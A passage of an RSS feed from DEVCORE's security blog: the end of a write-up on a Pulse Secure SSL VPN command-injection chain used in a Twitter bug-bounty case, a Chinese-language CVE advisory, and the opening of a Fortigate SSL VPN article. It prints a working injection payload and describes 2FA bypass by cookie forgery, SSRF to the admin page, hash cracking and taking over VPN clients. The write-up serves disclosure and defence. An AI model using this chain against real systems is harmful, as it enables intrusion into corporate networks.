  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$TCPDUMP_COMMAND&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -d &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$options&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;undef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Itâ€™s so obvious and straightforward that everyone can point out there is a command injection at the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;options&lt;/code&gt;! However, is it that easy? No!&lt;/p&gt;

&lt;p&gt;In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backtick&lt;/code&gt;â€¦&lt;/p&gt;

&lt;p&gt;This module is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt;. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is &lt;a href=&quot;https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147&quot;&gt;the code fragments on Gist&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;From the code fragments, you can see it replaces the original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; and do lots of checks in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__parsecmd&lt;/code&gt;. It also blocks numerous bad characters such as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[\&amp;amp;\*\(\)\{\}\[\]\`\;\|\?\n~&amp;lt;&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; supports and found that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-z postrotate-command&lt;/code&gt; may be useful. But the sad thing is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(&lt;/p&gt;

&lt;p&gt;While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data/runtime/tmp/tt/&lt;/code&gt; to speed up script rendering. So our next attempt is to write a file into the template cache directory via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w write-file&lt;/code&gt; argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.&lt;/p&gt;

&lt;p&gt;As it seems we had reached the end of argument injection, we tried to dig deeper into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSFAFE.pm&lt;/code&gt; implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we canâ€™t generate a valid Perl script still bothered us.&lt;/p&gt;

&lt;p&gt;We got stuck here, and itâ€™s time to think out of the box. Itâ€™s hard to generate a valid Perl script via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;, could we just write the Perl by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;? The answer is yes. When we force the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; to read a nonexistent-file via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r read-file&lt;/code&gt;. It shows the error:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;tcpdump: [filename]: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It seems we can â€œ&lt;strong&gt;partially&lt;/strong&gt;â€ control the error message. Then we tried the filename &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print 123#&lt;/code&gt;, and the magic happens!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print 123#&apos;&lt;/span&gt;
  tcpdump: print 123#: No such file or directory
 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print 123#&apos;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | perl â€“
  123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The error message becomes a valid Perl script now. Why? OK, letâ€™s have a Perl 101 lesson now!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, Perl supports the GOTO label, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump: &lt;/code&gt; becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!&lt;/p&gt;

&lt;p&gt;Finally, we use an incomplete I/O symbol &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; to fool the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt; command parser and redirect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; into the cache directory! Here is the final exploit:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-r$x=&quot;ls /&quot;,system$x# 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The concatenated command looks like:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/sbin/tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$x=&quot;ls /&quot;,system$x#&apos;&lt;/span&gt;
 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And the generated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setcookie.thtml.ttc&lt;/code&gt; looks like:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ls /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#: No such file or directory&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have done this, we can just fetch the corresponding page to execute our command:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://sslvpn/dana-na/auth/setcookie.cgi
 boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
 data  etc  lib   lost+found  modules  pkg  sbin  tmp 
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!&lt;/p&gt;

&lt;h1 id=&quot;the-case-study&quot;&gt;The Case Study&lt;/h1&gt;

&lt;p&gt;After Pulse Secure patched all the bugs on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their &lt;a href=&quot;http://hackerone.com/twitter&quot;&gt;bug bounty program&lt;/a&gt; and nice to hackers. However, itâ€™s improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P&lt;/p&gt;

&lt;p&gt;We started to hack Twitter on &lt;strong&gt;May 28, 2019&lt;/strong&gt;. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still canâ€™t log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from &lt;a href=&quot;https://duo.com&quot;&gt;Duo&lt;/a&gt;. The &lt;a href=&quot;https://duo.com/docs/pulseconnect&quot;&gt;manual&lt;/a&gt; mentions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Donâ€™t share it with unauthorized individuals or email it to anyone under any circumstances!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329&quot;&gt;Roaming Session&lt;/a&gt; feature, which is used to enhances mobility and allows a session from multiple IP locations.&lt;/p&gt;

&lt;p&gt;Due to this â€œ&lt;strong&gt;convenient&lt;/strong&gt;â€ feature, we can just download the session database and forge our cookies to log into their system!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. Itâ€™s the restricted management interface!&lt;/p&gt;

&lt;p&gt;As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the â€œ&lt;strong&gt;WebVPN&lt;/strong&gt;â€ feature! WebVPN is a proxy which helps to connect to anywhere. So, letâ€™s connect to itself.&lt;/p&gt;

&lt;p&gt;Yes, itâ€™s SSRF! &lt;br /&gt;&lt;br /&gt;Here we use a small trick to bypass the SSRF protections.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didnâ€™t have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so thatâ€™s why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so itâ€™s hard to get the managerâ€™s plaintext password. The only thing we got, is the password hash in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sha256(md5_crypt(salt, â€¦))&lt;/code&gt; formatâ€¦&lt;/p&gt;

&lt;p&gt;If you are experienced in cracking hashes, you will know how hard it is. Soâ€¦&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We launched a 72 core AWS to crack that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The managerâ€™s password length is only ten, and the first character is &lt;strong&gt;B&lt;/strong&gt;. Itâ€™s at a very early stage of our cracking queue so that we can crack the hash in 3 hours.&lt;/p&gt;

&lt;p&gt;We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the &lt;a href=&quot;https://hackerone.com/reports/591295&quot;&gt;HackerOne link&lt;/a&gt; for more details.&lt;/p&gt;

&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;

&lt;p&gt;How to mitigate such attacks? Here we give several recommendations.&lt;/p&gt;

&lt;p&gt;The first is the Client-Side Certificate. Itâ€™s also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.&lt;/p&gt;

&lt;p&gt;Also, perform your corporate asset inventory regularly and subscribe to the vendorâ€™s security advisory. The most important of all, always keep your system updated!&lt;/p&gt;

&lt;h1 id=&quot;bonus-take-over-all-the-vpn-clients&quot;&gt;Bonus: Take over all the VPN clients&lt;/h1&gt;

&lt;p&gt;Our company, &lt;a href=&quot;https://devco.re/&quot;&gt;DEVCORE&lt;/a&gt;, provides the most professional red team service in Asia. In this bonus part, letâ€™s talk about how to make the red team more &lt;strong&gt;RED&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.&lt;/p&gt;

&lt;p&gt;During our research, we found a new attack vector to take over all the clients. Itâ€™s the â€œ&lt;strong&gt;logon script&lt;/strong&gt;â€ feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secureâ€¦ and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.&lt;/p&gt;

&lt;p&gt;Due to this â€œ&lt;strong&gt;hacker-friendly&lt;/strong&gt;â€ feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/v7JUMb70ON4&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!&lt;/p&gt;

&lt;p&gt;Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/</link>
                <guid>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study</guid>
                <pubDate>Mon, 02 Sep 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pulse Secure SSL VPN è³‡å®‰é€šå ±</title>
                <description>&lt;h3 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h3&gt;

&lt;p&gt;åœ¨æˆ‘å€‘å° Pulse Secure SSL VPN çš„å®‰å…¨ç ”ç©¶ä¸­ï¼Œå…±ç™¼ç¾äº†ä¸‹åˆ—ä¸ƒå€‹å¼±é»ã€‚çµ„åˆåˆ©ç”¨æœ‰æ©Ÿæœƒå–å¾— SSL VPN è¨­å‚™çš„æœ€é«˜æ¬Šé™ï¼Œå¯è®“æ”»æ“Šè€…é€²å…¥ç”¨æˆ¶å…§ç¶²ï¼Œç”šè‡³æ§åˆ¶æ¯å€‹é€é SSL VPN é€£ç·šçš„ä½¿ç”¨è€…è£ç½®ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å—å½±éŸ¿çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç›®å‰å·²ç¶“å‡ºç¾æ”»æ“Šè€…å°å…¨ä¸–ç•Œè¨­å‚™é€²è¡Œå¤§è¦æ¨¡æƒæï¼Œè«‹ Pulse Secure SSL VPN ç”¨æˆ¶&lt;strong&gt;å„˜é€Ÿæ›´æ–°&lt;/strong&gt;ï¼Œéœ€è¦æ›´æ–°çš„ç‰ˆæœ¬è³‡æºå¯åƒè€ƒ&lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101&quot;&gt;åŸå»  Pulse Secure çš„å…¬å‘Š&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š
&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;ç›®å‰äº¦ç™¼ç¾æ”»æ“Šè€…å°æˆ‘å€‘ä¹‹å‰ç™¼è¡¨çš„ &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;Fortigate SSL VPN&lt;/a&gt; åŠ &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt; å¼±é»é€²è¡Œå¤§è¦æ¨¡æƒæï¼Œå†æ¬¡æé†’è«‹ç”¨æˆ¶å„˜é€Ÿæ›´æ–°ä»¥ä¸Š SSL VPN è¨­å‚™è‡³æœ€æ–°ç‰ˆã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory</guid>
                <pubDate>Wed, 28 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN</title>
                <description>&lt;p&gt;Author: Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;) and Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Last month, we talked about &lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto Networks GlobalProtect RCE&lt;/a&gt; as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will also give a speech at the following conferences, just come and find us!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2019/CMT/agenda&quot;&gt;HITCON&lt;/a&gt; - Aug. 23 @ Taipei (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gsec.hitb.org/sg2019/agenda/&quot;&gt;HITB GSEC&lt;/a&gt; - Aug. 29,30 @ Singapore&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.romhack.io/program_en-2019.html&quot;&gt;RomHack&lt;/a&gt; - Sep. 28 @ Rome&lt;/li&gt;
  &lt;li&gt;and more â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;lets-start&quot;&gt;Letâ€™s start!&lt;/h1&gt;

&lt;p&gt;The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!&lt;/p&gt;

&lt;p&gt;However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.&lt;/p&gt;

&lt;p&gt;At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking &lt;strong&gt;Fortigate SSL VPN&lt;/strong&gt;. The next article is going to be about &lt;strong&gt;Pulse Secure&lt;/strong&gt;, which is the most splendid one! Stay tuned!&lt;/p&gt;

&lt;h1 id=&quot;fortigate-ssl-vpn&quot;&gt;Fortigate SSL VPN&lt;/h1&gt;

&lt;p&gt;Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/remote/login&lt;/code&gt;. Here is the technical feature of Fortigate:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;All-in-one binary
  We started our research from the file system. We tried to list the binaries in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/&lt;/code&gt; and found there are all symbolic links, pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/init&lt;/code&gt;. Just like this:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Fortigate compiles all the programs and configurations into a single binary, which makes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init&lt;/code&gt; really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt;!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web daemon
  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/httpsd&lt;/code&gt; on the port 443. The other is normal user interface, handled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sslvpnd&lt;/code&gt; on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.&lt;/p&gt;

    &lt;p&gt;Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.&lt;/p&gt;

    &lt;p&gt;In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;WebVPN
  WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We found several vulnerabilities:&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379-pre-auth-arbitrary-file-reading&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt;: Pre-auth arbitrary file reading&lt;/h3&gt;
&lt;p&gt;While fetching corresponding language file, it builds the json file path with the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lang&lt;/code&gt;:&lt;/p&gt;
